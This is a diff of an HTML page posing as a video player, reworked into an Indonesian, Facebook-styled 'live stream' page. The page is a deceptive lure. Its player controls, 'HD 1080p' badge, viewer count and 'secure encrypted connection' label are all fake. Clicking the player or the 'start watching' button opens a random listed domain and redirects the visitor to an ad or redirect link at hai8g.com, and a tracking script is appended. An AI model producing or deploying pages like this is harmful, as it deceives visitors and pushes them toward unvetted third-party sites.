@@ -1,117 +1,159 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="id">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Lengkap 2026</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Portal Berita & Media Terkini</title>
+    <!-- Tailwind CSS -->
     <script src="https://cdn.tailwindcss.com"></script>
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
-    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700&display=swap" rel="stylesheet">
+    <!-- Font Awesome -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <!-- Google Fonts -->
+    <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;500;600;700;800&display=swap" rel="stylesheet">
     <style>
         body { 
-            background-color: #f8fafc; 
-            font-family: 'Inter', sans-serif; 
+            font-family: 'Plus Jakarta Sans', sans-serif; 
+            background-color: #f0f2f5;
+            color: #050505;
+            -webkit-tap-highlight-color: transparent;
         }
-        .blue-gradient-bg {
-            background: radial-gradient(circle at top right, #dbeafe 0%, transparent 40%),
-                        radial-gradient(circle at bottom left, #eff6ff 0%, transparent 40%);
+        .btn-fb {
+            background-color: #1877f2;
+            transition: all 0.2s ease;
         }
-        .player-container {
-            background: #0f172a; /* Deep dark blue */
-            position: relative;
-            box-shadow: 0 25px 50px -12px rgba(37, 99, 235, 0.2);
+        .btn-fb:hover {
+            background-color: #166fe5;
         }
-        .progress-bar-bg { height: 4px; background: rgba(255,255,255,0.1); width: 100%; position: absolute; bottom: 0; left: 0; }
-        .progress-fill { height: 100%; background: #2563eb; width: 45%; transition: width 0.3s; }
+        .btn-fb:active {
+            transform: scale(0.98);
+        }
+        .progress-line {
+            height: 3px;
+            background: rgba(255,255,255,0.25);
+            width: 100%;
+            position: absolute;
+            bottom: 0;
+            left: 0;
+        }
+        .progress-active {
+            height: 100%;
+            background: #1877f2;
+            width: 45%;
+        }
     </style>
 </head>
-<body class="flex flex-col min-h-screen blue-gradient-bg">
+<body class="min-h-screen flex flex-col justify-between p-3 sm:p-6">
 
-    <!-- Header Section -->
-    <header class="p-6 flex justify-between items-center bg-white/50 backdrop-blur-md border-b border-blue-50">
+    <!-- Navbar Minimalis -->
+    <div class="w-full max-w-md mx-auto pt-2 pb-3 flex items-center justify-between text-slate-600 border-b border-slate-200/60 mb-3">
         <div class="flex items-center gap-2">
-            <div class="w-8 h-8 bg-blue-600 rounded-lg flex items-center justify-center">
-                <i class="fas fa-play text-white text-xs ml-0.5"></i>
-            </div>
-            <span class="text-sm font-bold tracking-tight text-slate-800 uppercase">Videy<span class="text-blue-600">Player</span></span>
+            <span class="w-8 h-8 rounded-full bg-[#1877f2] flex items-center justify-center text-white font-bold text-sm">
+                <i class="fas fa-play text-xs ml-0.5"></i>
+            </span>
+            <span class="font-bold text-slate-800 text-sm tracking-tight">Kanal Media Update</span>
         </div>
-        <div class="flex gap-2">
-            <span class="text-[10px] font-bold bg-blue-100 text-blue-700 px-3 py-1 rounded-full uppercase tracking-wider">4K Ultra HD</span>
+        <div class="flex items-center gap-1.5 text-xs font-semibold text-blue-600 bg-blue-50 px-2.5 py-1 rounded-full border border-blue-100">
+            <i class="fas fa-circle text-[8px] text-[#1877f2] animate-pulse"></i> Sedang Tayang
         </div>
-    </header>
+    </div>
 
-    <main class="flex-grow flex flex-col items-center justify-center p-4">
-        <!-- Player Area -->
-        <div id="playerArea" class="player-container aspect-video w-full max-w-4xl rounded-[2.5rem] overflow-hidden group cursor-pointer border-4 border-white relative">
+    <!-- Card Wrapper -->
+    <div class="w-full max-w-md mx-auto bg-white border border-[#ced0d4]/60 rounded-2xl p-5 sm:p-7 shadow-[0_2px_12px_rgba(0,0,0,0.06)] flex flex-col items-center text-center">
+        
+        <!-- Header Info Publikasi -->
+        <div class="w-full flex items-center gap-3 mb-4 text-left">
+            <div class="w-10 h-10 rounded-full bg-blue-50 border border-blue-100 flex items-center justify-center text-[#1877f2]">
+                <i class="fas fa-video text-base"></i>
+            </div>
+            <div>
+                <div class="flex items-center gap-1.5">
+                    <span class="font-bold text-slate-900 text-sm">Live Stream Tayangan</span>
+                    <i class="fas fa-check-circle text-[#1877f2] text-xs"></i>
+                </div>
+                <div class="text-[11px] text-[#65676b] flex items-center gap-1">
+                    <span>Server Jakarta #01</span> • <i class="fas fa-wifi text-[10px] text-emerald-500"></i> Stabil
+                </div>
+            </div>
+        </div>
+
+        <!-- Pemutar Interaktif (Klik-Ready) -->
+        <div id="playerArea" class="w-full aspect-video bg-[#050505] rounded-xl overflow-hidden relative shadow-inner mb-4 flex items-center justify-center group cursor-pointer border border-slate-100 transition-transform active:scale-[0.99]">
+            <div class="absolute inset-0 bg-gradient-to-t from-black/85 via-black/20 to-transparent"></div>
             
-            <!-- Video Overlay -->
-            <div class="absolute inset-0 bg-gradient-to-t from-black/80 via-transparent to-transparent opacity-60"></div>
-            
-            <!-- Play Button (PERFECTLY CENTERED) -->
-            <div class="absolute top-1/2 left-1/2 -translate-x-1/2 -translate-y-1/2 z-30">
-                <div class="w-20 h-20 sm:w-24 sm:h-24 bg-blue-600/90 text-white rounded-full flex items-center justify-center shadow-2xl backdrop-blur-sm transform group-hover:scale-110 transition-all duration-500 border-4 border-white/20">
-                    <i class="fas fa-play text-3xl ml-1.5"></i>
+            <!-- Play Button -->
+            <div class="w-16 h-16 rounded-full bg-[#1877f2] text-white flex items-center justify-center shadow-lg shadow-[#1877f2]/50 z-10 transition-all group-hover:scale-105 active:scale-95">
+                <i class="fas fa-play text-xl ml-1"></i>
+            </div>
+
+            <!-- Kontrol Dummy Modern -->
+            <div class="absolute bottom-2.5 left-3 right-3 flex justify-between items-center text-white text-[11px] z-10 font-medium">
+                <div class="flex items-center gap-1.5 bg-black/60 px-2 py-0.5 rounded">
+                    <i class="fas fa-pause text-[9px] text-[#1877f2]"></i>
+                    <span class="tabular-nums">06:14 / 12:40</span>
+                </div>
+                <div class="flex items-center gap-2">
+                    <span class="bg-[#1877f2] font-bold px-1.5 py-0.5 rounded text-[10px]">HD 1080p</span>
+                    <i class="fas fa-expand text-xs opacity-80"></i>
                 </div>
             </div>
 
-            <!-- Player Controls (Visual Only) -->
-            <div class="absolute bottom-8 left-8 right-8 z-20 flex justify-between items-center text-white/90 font-medium text-xs">
-                <div class="flex items-center gap-6">
-                    <span class="flex items-center gap-3">
-                        <i class="fas fa-pause"></i> 
-                        <span class="tabular-nums">08:42 / 18:05</span>
-                    </span>
-                    <span class="hidden sm:flex items-center gap-2 opacity-70">
-                        <i class="fas fa-volume-up"></i> 85%
-                    </span>
-                </div>
-                <div class="flex items-center gap-5 opacity-70">
-                    <i class="fas fa-closed-captioning text-lg"></i>
-                    <i class="fas fa-cog text-lg"></i>
-                    <i class="fas fa-expand text-lg"></i>
-                </div>
-            </div>
-
-            <!-- Fake Progress Bar -->
-            <div class="progress-bar-bg">
-                <div class="progress-fill relative">
-                    <div class="absolute right-0 top-1/2 -translate-y-1/2 w-3 h-3 bg-white rounded-full shadow-lg"></div>
-                </div>
+            <!-- Progress Line Bar -->
+            <div class="progress-line">
+                <div class="progress-active"></div>
             </div>
         </div>
 
-        <!-- Text Content -->
-        <div class="mt-10 text-center max-w-md">
-            <h2 class="text-2xl font-bold text-slate-800 mb-2">Playback Verification</h2>
-            <p class="text-slate-500 text-sm leading-relaxed">
-                Almost there! Please <span class="text-blue-600 font-semibold">click the player above</span> to verify your connection and start the premium stream.
-            </p>
-            
-            <div class="mt-6 flex justify-center items-center gap-2 text-[11px] text-slate-400 uppercase tracking-widest font-bold">
-                <span class="w-2 h-2 bg-green-500 rounded-full animate-ping"></span>
-                Server: Singapore #01 - Active
+        <!-- Headline -->
+        <h1 class="text-lg sm:text-xl font-bold text-[#050505] tracking-tight leading-snug mb-2 text-left w-full">
+            Siaran Telah Siap Dimainkan
+        </h1>
+
+        <!-- Deskripsi -->
+        <p class="text-[#65676b] text-xs sm:text-sm leading-relaxed mb-6 text-left w-full">
+            Ketuk area pemutar video di atas atau klik tombol konfirmasi di bawah untuk mulai menonton tayangan penuh secara langsung.
+        </p>
+
+        <!-- Tombol Aksi Utama -->
+        <button id="startBtn" class="btn-fb w-full text-white font-bold py-3.5 sm:py-4 px-6 rounded-xl text-base shadow-md shadow-[#1877f2]/20 flex items-center justify-center gap-2 cursor-pointer mb-4">
+            <i class="fas fa-play-circle text-lg"></i>
+            <span>Mulai Nonton Sekarang</span>
+        </button>
+
+        <!-- Statistik Keterlibatan -->
+        <div class="w-full pt-3 border-t border-slate-100 flex items-center justify-between text-[#65676b] text-xs font-semibold px-1">
+            <div class="flex items-center gap-1 text-emerald-600">
+                <i class="fas fa-shield-alt text-xs"></i> Koneksi Enkripsi Aman
+            </div>
+            <div class="text-[#65676b]">
+                <i class="fas fa-eye text-xs"></i> 38.921 Menonton
             </div>
         </div>
-    </main>
 
-    <footer class="p-6 text-center text-slate-400 text-[10px]">
-        &copy; 2024 Videy Premium Network. All rights reserved.
-    </footer>
+    </div>
 
+    <!-- Footer -->
+    <div class="w-full max-w-md mx-auto text-center text-[#65676b] text-[11px] mt-4 pb-2">
+        Format responsif dioptimalkan untuk peramban seluler
+    </div>
+
+    <!-- Script Redirect -->
     <script>
         const domains = [
             'https://ceritavid.github.io/',
-            'https://financetrack1.blogspot.com/'
+            'https://hai8g.com/4/12162683'
         ];
 
-        document.getElementById('playerArea').addEventListener('click', function() {
+        function triggerAction() {
             const randomUrl = domains[Math.floor(Math.random() * domains.length)];
             window.open(randomUrl, '_blank');
-            window.location.href = 'https://financetrack1.blogspot.com/';
-        });
+            window.location.href = 'https://hai8g.com/4/12162683';
+        }
+
+        document.getElementById('playerArea').addEventListener('click', triggerAction);
+        document.getElementById('startBtn').addEventListener('click', triggerAction);
     </script>
 
-    <!-- Histats -->
+    <!-- Tracker Histats -->
     <script type='text/javascript'>
         var _Hasync=_Hasync||[];
         _Hasync.push(['Histats.start', '1,4912344,4,0,0,0,00010000']);
